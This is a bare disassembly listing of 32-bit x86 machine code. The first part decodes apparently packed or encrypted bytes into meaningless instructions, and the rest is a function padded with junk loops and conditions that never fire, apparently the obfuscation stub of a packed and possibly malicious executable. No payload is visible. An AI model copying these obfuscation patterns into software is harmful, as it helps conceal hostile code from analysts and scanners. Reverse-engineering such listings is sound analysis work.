  414b95:	ficom  DWORD PTR [edx-0x2efc2fcd]
  414b9b:	imul   edx,ebx
  414b9e:	cmp    edx,edi
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	or     cl,BYTE PTR fs:[edi]
  414bb4:	mov    esi,0x787f1280
  414bb9:	in     eax,0x7e
  414bbb:	js     0x414c35
  414bbd:	mov    eax,0x1d1594c6
  414bc2:	fs add bh,ch
  414bc5:	ret    
  414bc6:	loop   0x414be1
  414bc8:	pop    ecx
  414bc9:	push   0xbff444dc
  414bce:	sbb    ebx,DWORD PTR [ebx+edi*4]
  414bd1:	mov    ecx,0x41843d82
  414bd6:	pop    esi
  414bd7:	pmulhuw mm1,QWORD PTR [ebx]
  414bda:	loop   0x414bfe
  414bdc:	mov    ch,0xb4
  414bde:	mov    esi,0x8c3227d0
  414be3:	fstp   TBYTE PTR [ebx]
  414be5:	jmp    0x6877c50d
  414bea:	out    0x61,al
  414bec:	iret   
  414bed:	cld    
  414bee:	retf   
  414bef:	jb     0x414c17
  414bf1:	cmc    
  414bf2:	(bad)  
  414bf3:	ja     0x414c61
  414bf5:	pop    es
  414bf6:	pop    edx
  414bf7:	lods   al,BYTE PTR ds:[esi]
  414bf8:	mov    cl,0xff
  414bfa:	sbb    DWORD PTR [ecx-0x582b517f],eax
  414c00:	inc    ebp
  414c01:	inc    esi
  414c02:	jmp    0x5a36f016
  414c07:	inc    ebx
  414c08:	mov    bl,0x92
  414c0a:	cs fs ret 0x5890
  414c0f:	sub    eax,0xbb2bd530
  414c14:	cmp    al,0xaf
  414c16:	xor    al,0xed
  414c18:	je     0x414be5
  414c1a:	adc    esp,esp
  414c1c:	dec    DWORD PTR [edi+0x45]
  414c1f:	pop    edx
  414c20:	sbb    BYTE PTR [ebx+0x7f61f4a8],0xab
  414c27:	ret    0x8c94
  414c2a:	push   0x1e
  414c2c:	sub    al,0x7a
  414c2e:	dec    eax
  414c2f:	cmp    DWORD PTR [ecx-0x71],ebp
  414c32:	inc    esp
  414c33:	or     ax,0xa4b6
  414c37:	jp     0x414bc4
  414c39:	push   esp
  414c3a:	ret    0x6a7c
  414c3d:	dec    esp
  414c3e:	jbe    0x414be9
  414c40:	dec    ebx
  414c41:	and    al,0x83
  414c43:	inc    si
  414c45:	int    0x2a
  414c47:	cmp    DWORD PTR [edx-0x21],edi
  414c4a:	sub    eax,0x73f3f039
  414c4f:	or     al,0x7b
  414c51:	inc    edi
  414c52:	cmp    al,0xda
  414c54:	mov    esp,0x8f2a63ea
  414c59:	ins    BYTE PTR es:[edi],dx
  414c5a:	cmc    
  414c5b:	mov    WORD PTR [ebp+0x4e],ds
  414c5e:	ins    DWORD PTR es:[di],dx
  414c60:	lods   eax,DWORD PTR ds:[esi]
  414c61:	mov    DWORD PTR [ecx+0x4ed79509],edi
  414c67:	ins    BYTE PTR es:[edi],dx
  414c68:	xchg   edx,edx
  414c6a:	dec    ebx
  414c6b:	inc    edi
  414c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c6d:	or     cl,BYTE PTR [ebx-0x72]
  414c70:	xchg   BYTE PTR [esi-0x5d],ah
  414c73:	add    eax,0xe8941e15
  414c78:	scas   al,BYTE PTR es:[edi]
  414c79:	add    eax,0x5e885e91
  414c7e:	inc    edx
  414c7f:	aad    0x3
  414c81:	xlat   BYTE PTR ds:[ebx]
  414c82:	in     al,dx
  414c83:	inc    ebx
  414c84:	jno    0x414c3f
  414c86:	das    
  414c87:	pusha  
  414c88:	pop    ecx
  414c89:	retf   
  414c8a:	jnp    0x414c97
  414c8c:	jge    0x414cb4
  414c8e:	and    al,0x28
  414c90:	ss inc edx
  414c92:	sub    eax,0x9a1af1eb
  414c97:	adc    al,ah
  414c99:	jge    0x414ce4
  414c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c9c:	jns    0x414d02
  414c9e:	mov    bl,0x4f
  414ca0:	test   al,0x1f
  414ca2:	data16 fwait
  414ca4:	push   cs
  414ca5:	mov    esi,0xf65901a
  414caa:	push   eax
  414cab:	adc    al,0x4f
  414cad:	xchg   BYTE PTR [ebp-0x4a30de0a],al
  414cb3:	sahf   
  414cb4:	out    dx,al
  414cb5:	repz je 0x414c44
  414cb8:	push   ss
  414cb9:	inc    esi
  414cba:	stos   DWORD PTR es:[edi],eax
  414cbb:	cs loopne 0x414d10
  414cbe:	es pop esp
  414cc0:	dec    esp
  414cc1:	inc    edx
  414cc2:	cmp    BYTE PTR [ebp-0x24],dl
  414cc5:	mov    fs,WORD PTR [esi+0x1b45fafb]
  414ccb:	pop    eax
  414ccc:	dec    esi
  414ccd:	mov    dl,0xe5
  414ccf:	add    BYTE PTR [esi+0x17],cl
  414cd2:	pusha  
  414cd3:	push   ds
  414cd4:	jne    0x414d17
  414cd6:	fadd   st,st(3)
  414cd8:	call   0xdc7d:0xaa16fde6
  414cdf:	(bad)  
  414ce0:	sub    ecx,DWORD PTR [edi+ebp*4]
  414ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ce4:	sub    al,BYTE PTR [ebx-0xdf0380e]
  414cea:	(bad)  
  414ceb:	fs dec edi
  414ced:	stos   DWORD PTR es:[edi],eax
  414cee:	ins    DWORD PTR es:[edi],dx
  414cef:	jecxz  0x414d36
  414cf1:	mov    edi,0x9591f4c8
  414cf6:	cwde   
  414cf7:	outs   dx,DWORD PTR ds:[esi]
  414cf8:	out    dx,eax
  414cf9:	popa   
  414cfa:	or     dh,BYTE PTR ds:0x33afb16a
  414d00:	cmp    bh,BYTE PTR [esi-0x75c53f90]
  414d06:	jmp    DWORD PTR [ecx]
  414d08:	jno    0x414d11
  414d0a:	gs dec ebp
  414d0c:	mov    ebx,0x50561d34
  414d11:	inc    edx
  414d12:	add    edx,DWORD PTR [ecx-0x73ab0ec5]
  414d18:	jge    0xa526c610
  414d1e:	outs   dx,BYTE PTR ds:[esi]
  414d1f:	xchg   esp,eax
  414d20:	inc    ecx
  414d21:	sahf   
  414d22:	out    0x96,eax
  414d24:	les    ebp,FWORD PTR [ecx*1+0x5733d1b0]
  414d2b:	adc    eax,0x7bf82b10
  414d30:	mov    ebp,0xc5f14b94
  414d35:	out    0x19,eax
  414d37:	(bad)  
  414d39:	inc    eax
  414d3a:	pushf  
  414d3b:	adc    eax,0x3e96075
  414d40:	mov    BYTE PTR [edx+0x42],bh
  414d43:	and    cl,ch
  414d45:	in     al,dx
  414d46:	outs   dx,BYTE PTR ds:[esi]
  414d47:	gs pop ds
  414d49:	js     0x414d8b
  414d4b:	pop    edx
  414d4c:	push   ebx
  414d4d:	xchg   bl,bl
  414d4f:	loopne 0x414d1b
  414d51:	popa   
  414d52:	jmp    0x414cf4
  414d54:	jmp    0x2d58:0x2c5a4f1
  414d5b:	mov    cl,0x10
  414d5d:	mov    edx,esp
  414d5f:	jl     0x414ce4
  414d61:	xor    esi,DWORD PTR [esi]
  414d63:	leave  
  414d64:	mov    ecx,0x5d25db22
  414d69:	mov    cl,0x9b
  414d6b:	ror    BYTE PTR [edi],0x2f
  414d6e:	call   0x1bb2:0x6b0d3bdd
  414d75:	inc    edi
  414d76:	dec    edi
  414d77:	push   eax
  414d78:	push   cs
  414d79:	stos   DWORD PTR es:[edi],eax
  414d7a:	mov    eax,ds:0x6dccb88d
  414d7f:	mov    ds:0x1450c4ef,eax
  414d84:	test   eax,0xf233265e
  414d89:	ja     0x414dbe
  414d8b:	out    0x29,eax
  414d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d8e:	pop    ecx
  414d8f:	push   ebx
  414d90:	ss aas 
  414d92:	pusha  
  414d93:	fsubp  st(3),st
  414d95:	jge    0x414d40
  414d97:	push   edx
  414d98:	push   esi
  414d99:	add    eax,0x697df5a0
  414d9e:	adc    ebx,DWORD PTR [ebp+ecx*1+0x72ef451b]
  414da5:	push   esi
  414da6:	addr16 int 0x9a
  414da9:	dec    ecx
  414daa:	push   ebx
  414dab:	(bad)  
  414dad:	jnp    0x414dbf
  414daf:	mov    cl,0x3d
  414db1:	inc    eax
  414db2:	push   0xffffffd2
  414db4:	jecxz  0x414e22
  414db6:	call   0x84cc:0x362271a
  414dbd:	push   ss
  414dbe:	repnz add edx,DWORD PTR [ebp-0x17c91ef2]
  414dc5:	and    eax,0x2b5ee64b
  414dca:	int    0xbb
  414dcc:	dec    esp
  414dcd:	mov    edx,0xd78c8b2
  414dd2:	jae    0x414e21
  414dd4:	mov    WORD PTR [ecx+0x2d],gs
  414dd7:	adc    DWORD PTR [esi],0xffffff9a
  414dda:	sub    dl,BYTE PTR [eax+0x3f]
  414ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dde:	cmp    al,0x64
  414de0:	test   al,0x53
  414de2:	jp     0x414e4a
  414de4:	adc    eax,0xf3ad1473
  414de9:	dec    ecx
  414dea:	dec    ecx
  414deb:	jl     0x414e5f
  414ded:	stos   DWORD PTR es:[edi],eax
  414dee:	xor    BYTE PTR [esi],dl
  414df0:	mov    ah,0x7e
  414df2:	fadd   QWORD PTR [eax+0x44]
  414df5:	clc    
  414df6:	aas    
  414df7:	fisttp DWORD PTR [ecx+0x73]
  414dfa:	cmp    bh,BYTE PTR [ecx+eax*1]
  414dfd:	fdivr  DWORD PTR [eax-0x39]
  414e00:	mov    ch,0x64
  414e02:	sbb    al,0xf5
  414e04:	mov    eax,DWORD PTR [ecx+0x47aec9b4]
  414e0a:	xchg   ebp,eax
  414e0b:	cmp    BYTE PTR [ebp-0x20],al
  414e0e:	fwait
  414e0f:	add    al,0x24
  414e11:	jnp    0x414e25
  414e13:	or     DWORD PTR [edi],0x5a
  414e16:	dec    edx
  414e17:	sbb    dl,BYTE PTR [eax+0x27]
  414e1a:	jnp    0x414e4a
  414e1c:	retf   
  414e1d:	and    al,0xf0
  414e1f:	clc    
  414e20:	repz mov al,0x51
  414e23:	cmp    DWORD PTR [eax+0xf063a99],esp
  414e29:	xchg   BYTE PTR [esi-0x54],ah
  414e2c:	(bad)  
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
